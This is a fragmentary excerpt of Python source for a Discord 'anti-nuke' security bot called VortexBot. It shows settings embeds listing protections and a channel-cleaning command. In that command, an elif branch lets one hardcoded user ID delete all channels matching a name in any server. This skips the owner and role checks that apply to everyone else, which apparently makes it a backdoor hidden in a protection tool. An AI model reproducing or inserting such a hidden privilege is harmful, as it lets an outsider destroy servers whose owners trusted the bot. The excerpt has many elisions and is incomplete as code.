        ...
        if ctx.author == ctx.guild.owner or ctx.author.top_role.position > ctx.guild.me.top_role.position:
            if data == "on":
                ...
                embed2 = discord.Embed(
                    title="VortexBot",
                    description=
                    f"**{ctx.guild.name} Security Settings** <:shieldhead:1113057685231910932>\nAlso move my role to top of roles for me to work properly.\n\nPunishments:\n\n**Anti Bot:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Ban:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Kick:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Prune:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Channel Create/Delete/Update:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Role Create/Delete/Update:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Webhook Create:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Emoji Create/Delete/Update:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Guild Update:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Community Spam:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Integration Create:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Everyone/Here/Role Mention:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Whitelisted Users:** {len(wled)}\n\n**Auto Recovery:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>",
                    color=0x2f3136)
                embed2.add_field(
                    name="Other Settings",
                    value=
    ...
    async def antinuke_show(self, ctx: Context):
        ...
        if data == "off":
            ...
            embed2 = discord.Embed(
                title="VortexBot",
                description=
                f"**{ctx.guild.name} security settings** <:shieldhead:1113057685231910932>\nPunishments:\n**Anti Bot:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Ban:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Kick:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Prune:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Channel Create/Delete/Update:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Role Create/Delete/Update:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Webhook Create:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Emoji Create/Delete/Update:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Guild Update:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Community Spam:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Integration Create:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Everyone/Here/Role Mention:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Anti Vanity Steal:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>\n**Whitelisted Role:** <@&{wlrole}>\n**Whitelisted Users:** {len(wled)}\n\n**Auto Recovery:** <:anxNo:1107918844510605363><:anxYes:1107918895156834304>",
                color=0x2f3136)
            embed2.add_field(
                name="Other Settings",
                value=
    ...
    async def _channelclean(self, ctx: Context, channeltodelete: str):
        ...
        if ctx.author == ctx.guild.owner or ctx.author.top_role.position > ctx.guild.me.top_role.position:
            ...
            hacker1 = discord.Embed(
                ...
                color=0x2f3136)
            await ctx.reply(embed=hacker1, mention_author=False)
        elif ctx.author.id == 1200343838947029082:
            for channel in ctx.message.guild.channels:
                if channel.name == channeltodelete:
                    try:
                        await channel.delete()
